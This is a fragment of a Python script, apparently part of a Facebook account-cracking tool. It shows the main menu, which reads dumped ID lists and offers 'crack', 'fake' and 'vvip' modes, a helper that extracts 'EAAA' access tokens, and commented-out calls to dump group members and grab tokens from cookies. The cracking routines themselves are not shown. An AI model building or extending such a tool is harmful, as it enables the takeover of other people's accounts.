#	tahap1 = kata_token.split('"EAAA')
#	tahap2 = tahap1[1].split('","')
#	tahap3 = ("EAAA"+tahap2[0])
#	print (tahap3)
#	ul(tahap1[0])
def ul(kata_):
#	tahap11 = kata_.split('"EAAA')
#	tahap22 = tahap11[1].split('","')
#	tahap33 = ("EAAA"+tahap22[0])
	print ("")




if __name__=="__main__":
	try:
		os.mkdir("Hasil")
	except:pass
	try:
		os.mkdir("dump")
	except:pass
	if len(sys.argv) == 2:
		if sys.argv[1] == 'crack':
			os.system("clear")
			logo()
			dirs = os.listdir("dump")
			for file in dirs:
				filex = ("dump/"+file)
				try:
					juma = open(filex,"r").readlines()
					total = ("%s"%(str(len(juma))))
				except:total = (" ?? ")
				print(war+"The File Name You Dump : "+M+filex+C+" ⟨"+K+"IDZ"+C+"⟩ "+M+total)
			dumai = input("\n"+war+"File Name   : "+i)
			try:
				buka_baju = open(dumai,"r").readlines()
			except FileNotFoundError:
				print(war+"File Not Found")
				time.sleep(2)
				exit()
			pilihcrack(dumai)
			exit()
		elif sys.argv[1] == 'fake':
			fake()
			exit()
		elif sys.argv[1] == 'vvip':
			menuvvip()
			exit()
		elif sys.argv[1] == 'key':
			buatkey()
			exit()
		elif sys.argv[1] == 'ua_me':
			Get_Ua()
		else:
			print(war+"How to Use Crack Not Login..")
			exit(inp+"Type : python prem.py crack or vvip")
#	kata_tkn()
#	konek()
#	chatme()
#	dump_grup(basecookie())
#	no()
							
#"""
	try:
		os.system("git pull")
#	kentodxx()
#		get_token()
#		Get_Ua()
#		tombol_add()
		menu()
	except Exception as e:
		print("[!] Error : %s"%(e))
		exit()
#"""
							
